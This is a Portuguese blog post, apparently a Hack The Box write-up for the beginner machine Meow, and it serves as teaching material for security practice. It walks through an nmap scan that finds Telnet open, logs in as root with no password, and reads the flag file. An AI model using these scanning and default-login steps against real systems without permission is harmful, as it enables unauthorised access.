---
title: "Hack The Box - Write-up da Máquina Meow"
date: 2025-09-03 17:08:00
categories:
  - Hack The Box
tags:
  - CTF
  - Linux
  - Nmap
  - Telnet
---

Olá! Este é o meu primeiro write-up para o blog, começando com a máquina **Meow** do Hack The Box. Esta é uma máquina de nível "Muito Fácil" (Tier 0), perfeita para iniciantes se familiarizarem com o processo básico de enumeração e acesso.

### Passo 1: Reconhecimento com Nmap

Como sempre, o primeiro passo é escanear a máquina para descobrir quais portas estão abertas e quais serviços estão rodando nelas. Para isso, utilizamos o Nmap.

Executei o seguinte comando para um scan rápido dos serviços e versões:

```bash
nmap -sV -T4 10.10.10.10 
(Lembre-se de substituir 10.10.10.10 pelo IP da máquina Meow)

O resultado mostrou uma porta muito interessante aberta:

Starting Nmap 7.91 ( [https://nmap.org](https://nmap.org) ) at 2025-09-03 17:00 -03
Nmap scan report for 10.10.10.10
Host is up (0.18s latency).
Not showing: 999 closed ports
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 12.84 seconds
O scan revelou que a porta 23 (Telnet) está aberta. Telnet é um protocolo de acesso remoto antigo e inseguro, pois não utiliza criptografia. É sempre um bom ponto de partida para um ataque.

Passo 2: Acesso Inicial via Telnet
Com a porta 23 aberta, podemos tentar nos conectar diretamente usando o cliente Telnet.

Bash

telnet 10.10.10.10
Ao conectar, o serviço pediu um login. Em máquinas de CTF fáceis, é comum testar credenciais padrão. Tentei o usuário root:

Trying 10.10.10.10...
Connected to 10.10.10.10.
Escape character is '^]'.

Meow login: root
Para minha surpresa, o sistema me deu acesso como root sem pedir senha! Este é um erro de configuração de segurança gravíssimo.

Passo 3: Capturando a Flag
Agora que estamos dentro do sistema com o usuário de maior privilégio, o próximo passo é encontrar a flag. Geralmente, ela está no diretório /root ou /home.

Usei o comando ls para listar os arquivos no diretório atual:

Bash

# ls
flag.txt
Aí está ela! Para ler o conteúdo do arquivo, usei o comando cat:

Bash

# cat flag.txt
b403...[CONTEÚDO_DA_SUA_FLAG]...d074
E com isso, a máquina foi comprometida e a flag capturada.

Conclusão
A máquina Meow é um ótimo exemplo de como configurações inseguras podem levar a um comprometimento total do sistema. Deixar um serviço como o Telnet exposto para a internet, especialmente com um usuário root sem senha, é um convite para um desastre.

O que aprendemos:

Sempre verifique portas abertas com o Nmap.

Telnet é um serviço inseguro e um forte candidato a ponto de entrada.

Nunca deixe usuários, especialmente o root, sem senha.

